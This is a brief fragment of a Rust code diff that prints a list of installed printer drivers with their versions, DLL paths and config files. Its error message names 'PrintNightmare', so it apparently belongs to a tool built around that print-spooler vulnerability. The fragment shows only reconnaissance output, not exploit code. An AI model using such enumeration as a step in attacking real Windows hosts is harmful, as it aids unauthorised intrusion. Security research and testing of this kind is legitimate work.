+                    banner::print_success(&format!("{} driver(s) installed", drivers.len()));
+                    for d in &drivers {
+                        println!(
+                            "  {} [v{}] {}",
+                            "*".cyan(),
+                            d.c_version,
+                            d.name.as_deref().unwrap_or("?").bright_cyan()
+                        );
+                        println!("      env    : {}", d.environment.as_deref().unwrap_or("-"));
+                        println!("      dll    : {}", d.driver_path.as_deref().unwrap_or("-"));
+                        println!("      data   : {}", d.data_file.as_deref().unwrap_or("-"));
+                        println!("      config : {}", d.config_file.as_deref().unwrap_or("-"));
+                    }
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("PrintNightmare list failed: {e}"));
+                    1
+                }
+            }
+        }
+    }
 }
